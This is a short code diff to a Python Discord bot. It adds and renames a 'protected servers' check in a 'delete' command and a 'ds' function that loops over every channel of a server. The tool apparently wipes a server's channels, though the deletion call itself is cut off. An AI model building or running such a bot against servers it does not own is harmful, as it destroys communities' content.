@@ -42,6 +42,9 @@ async def delete(ctx):
             print(f"[{ctx.guild.name}] {ctx.author} cancelled!")
             await ctx.send("Cancelled")
         else:
+            if sid in settings["protser"]:
+                await ctx.send("Server Protected!")
+                return
             await ds(ctx.guild.id)
             return
 
@@ -50,7 +53,7 @@ async def ds(sid):
     server = bot.get_guild(sid)
     with open("settings.json") as f:
         settings = json.load(f)
-    if sid in settings["protservers"]:
+    if sid in settings["protser"]:
         return
     for channel in server.channels:
         try:
